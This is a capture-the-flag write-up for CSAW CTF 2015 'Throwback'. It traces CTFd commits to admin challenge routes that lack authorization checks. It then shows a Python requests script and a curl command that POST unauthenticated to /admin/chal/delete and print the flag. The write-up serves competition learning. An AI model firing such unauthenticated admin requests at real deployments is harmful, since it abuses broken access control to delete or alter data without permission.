# CSAW CTF 2015: Throwback

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| CSAW CTF 2015 | Throwback | Web |    600 |

**Description:**
>*Programming is hard. CTF software is hard too. We broke our CTF software a few years ago and looks like we did it again this year
:( :( :(*
>
>*HINT: If you are smart about it, you do not need to attack the CTF infrastructure.*
>
>*HINT: The source code of our CTF software is on our Github. Also if you tried the challenge with flag{} before, try again.*

----------
## Write-up

Hmmm? So CTFd also contains vulns aye? 

Lets look at the commits from this year:

https://github.com/isislab/CTFd/commits/master

>https://github.com/isislab/CTFd/commit/9578355143d7af675fc4776b0f2de802be91e261

>"Fix authentication for certain admin actions" 

So apparently, the following routes are not restricted to admin users properly:

>```
>/admin/chal/new
>/admin/chal/delete
>/admin/chal/update
>```

Ok, good to know.. looking further..


>https://github.com/isislab/CTFd/commit/5f4a670b7a89f6a4d4536c2b3865391081ac5c9a

>"Removing debug print statement"

This commit removes a 'print files' statement from the /admin/chal/delete action.

Didn't we just see that action?

We can reach the statement by issueing a POST request to https://ctf.isis.poly.edu/admin/chal/delete, we also need to set the ID parameter:

>```python
>#!/usr/bin/env python
>import requests
>print requests.post('https://ctf.isis.poly.edu/admin/chal/delete',{'id':'ayylmao'},verify=False).text
>```

or simply

>```bash
>curl --url 'https://ctf.isis.poly.edu/admin/chal/delete' --data 'id=ayylmao'
>```

Which outputs

>```
>flag{at_least_it_isnt_php}
```

